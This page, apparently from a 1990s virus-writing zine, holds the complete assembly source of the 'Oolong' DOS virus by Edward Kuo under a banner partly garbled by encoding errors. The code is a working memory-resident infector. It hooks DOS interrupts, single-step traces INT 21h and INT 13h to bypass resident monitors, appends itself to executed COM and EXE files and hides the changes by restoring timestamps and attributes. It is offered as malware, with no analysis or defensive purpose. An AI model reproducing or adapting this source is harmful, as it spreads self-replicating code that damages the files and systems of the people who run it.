
                                                                     P.007

         TpVOtPVoTpvOTpVOtpVoTPvOTPVOtpVOTPvOtPVOtPVOtPvOTPvOTpVoTPVO
         PT                                                        OT
         VP     ¥x ÆW «Â ¤O ¯f ¬r ²Õ Â´   ¯f¬rÂø»x   ²Ä ‘B ´Á      TP
         oV                                                        PV
         TO                 Ææ  Oolong virus  Ææ                   Vo
         pT                                                        OT
         VP                    by  Edward Kuo                      VP
         OV                                                        OV
         OVTPVoTpvOtPvoTPVOtPvoTpVotpvoTpVotpvOtPvoTpVOtpvOTPvOTpvOTP


;=========================[ Oolong virus ]==============================
.286
.model small
.code
org 100h
vir_leght=end_start-start
start:  call s_1
s_1:    mov bp,sp
        mov di,ss:[bp]
        mov cx,offset s_1
s_2:    dec di
        loop s_2
        add sp,02
        push cs
        pop ds
        mov word ptr ds:[di+offset old_es],es
        mov byte ptr cs:cmp_cli,00
        push cs
        pop es
        mov ah,0f9h
        int 21h
        mov byte ptr ds:[di+offset memory_virus],00h
        cmp ax,1234h
        jz s_3
        mov byte ptr ds:[di+offset memory_virus],01h
s_3:    mov ah,62h
        int 21h
        push bx
        pop ds
        push ds:[2ch]
        pop ds
        xor si,si
        mov cx,100h
s_4:    cmp word ptr ds:[si],0
        jz s_5
        inc si
        loop s_4
s_5:    add si,04h
        mov cx,100h
s_6:    cmp byte ptr ds:[si],'.'
        jz s_7
        inc si
        loop s_6
s_7:    inc si
        push ds
        push cs
        pop ds
        cmp byte ptr ds:[di+offset memory_virus],01h
        pop ds
        jz s_9
        cmp byte ptr ds:[si],'C'
        push cs
        pop ds
        jnz s_8
        lea si,[di+offset old_head_data]
        mov cx,03h
        mov di,100h
        rep movsb
        mov bp,sp
        mov word ptr ss:[bp-02h],100h
        sub sp,02h
        ret
s_8:    push ds:[di+offset exe_cs]
        push ds:[di+offset exe_ip]
        retf
s_9:    cmp byte ptr ds:[si],'C'
        push si
        push ds
        push cs
        pop ds
        jnz s_11
        lea si,[di+offset start]
        mov ah,4ah
        mov bx,1000h
        int 21h
        mov di,100h
s_10:   mov cx,vir_leght
        rep movsb
        mov ax,offset s_12
        jmp ax
S_11:   mov ax,offset s_12-100h
        xchg si,di
        xor di,di
        mov cx,vir_leght
        rep movsb
        jmp ax
s_12:   call trace
        pop ds
        pop si
        mov cx,100h
s_13:   cmp byte ptr ds:[si],0
        jz s_14
        dec si
        loop s_13
s_14:   inc si
        mov dx,si
        mov word ptr cs:option+04h,cs
        mov word ptr cs:option+08h,es
        mov word ptr cs:option+0ch,es
        mov bx,offset option
        mov ax,4b00h
        pushf
        call dword ptr cs:n_int21ip
        mov ah,4dh
        pushf
        call dword ptr cs:n_int21ip
        push es
        pop ds
        mov ah,31h
        mov dx,vir_leght
        mov cl,4
        shr dx,cl
        add dx,11h
        pushf
        call dword ptr cs:n_int21ip
;-----------------------------------
new_int24:
        xor al,al
        iret
;-------------------------------------
trace proc near
        push ds
        push es
        mov ax,3521h
        int 21h
        mov word ptr cs:o_int21ip,bx
        mov word ptr cs:o_int21ip[2],es
        sub al,20h
        int 21h
        mov word ptr cs:o_int01ip,bx
        mov word ptr cs:o_int01ip[2],es
        cli
        push ds
        push 0
        pop ds
        mov word ptr ds:[04h],offset new_int01
        mov word ptr ds:[06h],cs
        pop ds
        call tf_on
        mov ah,52h
        cli
        pushf
        call dword ptr cs:o_int21ip
        call tf_off
        lds bx,cs:n_int21ip
        cmp word ptr cs:n_int21ip[2],0100h
        jb t_0
        mov bx,[bx+08h]
        lds bx,ds:[bx]
t_0:    cmp byte ptr ds:[bx],0fah
        jnz t_0_1
        mov byte ptr cs:cmp_cli,01
t_0_1:  push bx
        mov cx,05
t_0_2:  cmp byte ptr ds:[bx],0eah
        jz t_0_4
        inc bx
        loop t_0_2
        pop bx
        push bx
        mov cx,05
t_0_3:  cmp byte ptr ds:[bx],09ah
        jz t_0_4
        inc bx
        loop t_0_3
        pop bx
        jmp t_1_2
t_0_4:  add sp,02h
        add bx,05h
        cmp byte ptr cs:cmp_cli,01
        jz t_1_2
        inc bx
t_1_2:  mov word ptr cs:n_int21ip,bx
        mov word ptr cs:n_int21ip[2],ds
        push 0
        pop ds
        mov ax,word ptr cs:o_int01ip
        mov bx,word ptr cs:o_int01ip[2]
        mov word ptr ds:[04h],ax
        mov word ptr ds:[06h],bx
        mov ax,offset new_int21
        mov word ptr ds:[84h],ax
        mov word ptr ds:[86h],cs
        lds bx,ds:[0a8h]
        cmp byte ptr ds:[bx],0cfh
        jz t_2
        mov byte ptr ds:[bx],0cfh
t_2:    pop es
        pop ds
        call trace_int13
        ret
        endp
;-----------------------------------------
new_int01:
        push bp
        mov bp,sp
        cmp word ptr ss:[bp+04h],0320h
        ja exit_01
        push ds
        push bx
        lds bx,ss:[bp+02h]
        mov word ptr cs:n_int21ip,bx
        mov word ptr cs:n_int21ip[2],ds
        and word ptr ss:[bp+06h],0feffh
        pop bx
        pop ds
exit_01:pop bp
        iret
;-------------------------------------
tf_on proc  near
        pushf
        pop ax
        or ax,0100h
        push ax
        popf
        ret
        endp
;-------------------------------------
tf_off proc near
        pushf
        pop ax
        and ax,0feffh
        push ax
        popf
        ret
        endp
;-------------------------------------
trace_int13 proc near
        push ds
        push es
        mov ax,3513h
        int 21h
        mov word ptr cs:o_int13ip,bx
        mov word ptr cs:o_int13ip[2],es
        push 0
        pop ds
        cmp word ptr ds:[4Eh],0320h
        jb t_13_1
        push ds
        mov ax,offset new_int01_13
        mov word ptr ds:[04h],ax
        mov word ptr ds:[06h],cs
        push cs
        pop ds
        call tf_on
        mov ah,00h
        pushf
        cli
        call dword ptr cs:o_int13ip
        call tf_off
        push 0
        pop ds
        mov ax,word ptr cs:o_int01ip
        mov bx,word ptr cs:o_int01ip[2]
        mov word ptr ds:[04h],ax
        mov word ptr ds:[06h],bx
        lds bx,ds:[4Ch]
        mov byte ptr ds:[bx],0eah
        mov ax,word ptr cs:n_int13ip
        mov cx,word ptr cs:n_int13ip[2]
        mov word ptr ds:[bx+01h],ax
        mov word ptr ds:[bx+03h],cx
        pop ds
        cmp word ptr ds:[7b6h],0f000h
        jz exit_13
        mov ax,offset new_int01_f000
        mov word ptr ds:[04h],ax
        mov word ptr ds:[06h],cs
        call tf_on
        mov ah,00h
        pushf
        cli
        call dword ptr cs:o_int13ip
        call tf_off
        jmp t_13_2
t_13_1: jmp exit_13
t_13_2: mov ax,word ptr cs:o_int01ip
        mov cx,word ptr cs:o_int01ip[2]
        mov word ptr ds:[04h],ax
        mov word ptr ds:[06h],cx
        lds bx,ds:[7b4h]
        mov byte ptr ds:[bx],0eah
        mov ax,word ptr cs:n_int13_f000
        mov cx,word ptr cs:n_int13_f000[2]
        mov word ptr ds:[bx+01h],ax
        mov word ptr ds:[bx+03h],cx
exit_13:pop es
        pop ds
        ret
        endp
;-----------------------------------
new_int01_13:
        push bp
        mov bp,sp
        cmp word ptr ss:[bp+04h],0320h
        ja  exit_01_13
        push ds
        push bx
        lds bx,ss:[bp+02h]
        mov word ptr cs:n_int13ip,bx
        mov word ptr cs:n_int13ip[2],ds
        and word ptr ss:[bp+06h],0feffh
        pop bx
        pop ds
exit_01_13:
        pop bp
        iret
;----------------------------------
new_int01_f000:
        push bp
        mov bp,sp
        cmp word ptr ss:[bp+04h],0f000h
        jnz exit_01_13
        push ds
        push bx
        lds bx,ss:[bp+02h]
        mov word ptr cs:n_int13_f000,bx
        mov word ptr cs:n_int13_f000[2],ds
        and word ptr ss:[bp+06h],0feffh
        pop bx
        pop ds
exit_01_f000:
        pop bp
        iret
;-----------------------------------------
new_int21:
        mov byte ptr cs:cmp_leght_3,00h
        cmp ah,0f9h
        jnz new_1
        mov ax,1234h
        iret
new_1:  pushf
        pusha
        cmp ah,4bh
        jz new_3
new_2:  popa
        popf
        jmp dword ptr cs:o_int21ip
new_3:  push dx
        pop si
        mov cx,100h
new_4:  cmp byte ptr ds:[si],'.'
        jz new_5
        inc si
        loop new_4
new_5:  add si,01h
        cmp word ptr ds:[si],'OC'
        jz new_7
        cmp word ptr ds:[si],'XE'
        jz new_6
        jmp new_2
new_6:  mov byte ptr cs:exe_type,01
new_7:  push ds
        mov ax,offset new_int24
        push 0
        pop ds
        xchg word ptr ds:[90h],ax
        mov word ptr cs:o_int24ip,ax
        mov ax,cs
        xchg word ptr ds:[92h],ax
        mov word ptr cs:o_int24ip[2],ax
       ;mov word ptr ds:[04h],0000h
        pop ds
        push ds
        push dx
        mov ax,4300h
        pushf
        call dword ptr cs:n_int21ip
        push cx
        xor cx,cx
        mov ax,4301h
        pushf
        call dword ptr cs:n_int21ip
        mov ax,3d02h
        pushf
        call dword ptr cs:n_int21ip
        xchg ax,bx
        mov ah,45h
        pushf
        call dword ptr cs:n_int21ip
        push ax
        pop bx
        push cs
        pop ds
        mov ax,5700h
        pushf
        call dword ptr cs:n_int21ip
        push dx
        push cx
        mov ax,4202h
        xor cx,cx
        cwd
        pushf
        call dword ptr cs:n_int21ip
        cmp dx,0
        jnz new_7_1
        cmp ax,03h
        ja new_7_1
        mov byte ptr cs:cmp_leght_3,01
new_7_1:mov ax,4200h
        xor cx,cx
        cwd
        pushf
        call dword ptr cs:n_int21ip
        cmp byte ptr cs:cmp_leght_3,01
        jz new_8
        cmp byte ptr cs:exe_type,01
        jz  new_7_2
        mov ah,3fh
        mov cx,03h
        mov dx,offset old_head_data
        pushf
        call dword ptr cs:n_int21ip
        mov si,dx
        cmp byte ptr ds:[si],0e9h
        jz new_8
        mov ax,4202h
        xor cx,cx
        cwd
        pushf
        call dword ptr cs:n_int21ip
        sub ax,03h
        mov word ptr cs:jmp_add,ax
        mov ah,40h
        mov cx,vir_leght
        mov dx,offset start
        pushf
        call dword ptr cs:n_int21ip
        jc new_8
        mov ax,4200h
        xor cx,cx
        cwd
        pushf
        call dword ptr cs:n_int21ip
        mov ah,40h
        mov cx,03h
        mov dx,offset jmp_code
        pushf
        call dword ptr cs:n_int21ip
        jmp new_8
new_7_2: jmp new_9
new_8:  pop cx
        pop dx
        mov ax,5701h
        pushf
        call dword ptr cs:n_int21ip
        mov ah,3eh
        pushf
        call dword ptr cs:n_int21ip
        pop cx
        pop dx
        pop ds
        mov ax,4301h
        pushf
        call dword ptr cs:n_int21ip
        push ds
        mov ax,word ptr cs:o_int24ip
        mov bx,word ptr cs:o_int24ip[2]
        push 0
        pop ds
        mov word ptr ds:[90h],ax
        mov word ptr ds:[92h],bx
        pop ds
        jmp new_2
new_9:  mov ah,3fh
        mov cx,1ch
        mov dx,offset exe_head
        pushf
        call dword ptr cs:n_int21ip
        cmp word ptr cs:[exe_head+12h],'KE'
        jz new_8
        push cs:old_es
        pop es
        mov ax,es
        add ax,10h
        add ax,word ptr cs:[exe_head+16h]
        mov word ptr cs:exe_cs,ax
        mov ax,word ptr cs:exe_head+14h
        mov word ptr cs:exe_ip,ax
        mov ax,4202h
        xor cx,cx
        cwd
        pushf
        call dword ptr cs:n_int21ip
        push dx
        push ax
        jmp new_9_2
new_9_1:jmp new_8
new_9_2:
        mov ah,40h
        mov cx,vir_leght
        mov dx,offset start
        pushf
        call dword ptr cs:n_int21ip
        jc new_9_1
        mov ax,4202h
        xor cx,cx
        cwd
        pushf
        call dword ptr cs:n_int21ip
        mov cx,200h
        div cx
        cmp dx,0
        jz new_10
        inc ax
new_10: mov word ptr cs:exe_head+02h,dx
        mov word ptr cs:exe_head+04h,ax
        pop ax
        pop dx
        mov cx,10h
        div cx
        sub ax,word ptr cs:exe_head+08h
        mov word ptr cs:exe_head+16h,ax
        mov word ptr cs:exe_head+14h,dx
        mov word ptr cs:exe_head+12h,'EK'
        mov ax,4200h
        xor cx,cx
        cwd
        pushf
        call dword ptr cs:n_int21ip
        mov ah,40h
        mov cx,1ch
        mov dx,offset exe_head
        pushf
        call dword ptr cs:n_int21ip
        jmp new_8
;-----------------------------
o_int21ip dd ?
o_int01ip dd ?
o_int24ip dd ?
n_int21ip dd ?
o_int13ip dd ?
n_int13ip dd ?
n_int13_f000 dd ?
cmp_leght_3 db ?
cmp_cli db 0
jmp_code db 0e9h
jmp_add dw ?
exe_type db 0
memory_virus db 0
old_head_data db 0cdh,20h,00h
exe_head db 1ch dup(0)
old_es dw ?
exe_cs dw ?
exe_ip dw ?
option db 00,00,80h,00,00,00,5ch,00,00,00,6ch,00,00,00
mark db 'Oolong V2.0 virus by [E.K] '
;---------------------------------
end_start:
end start
;=========================[ End of virus ]============================

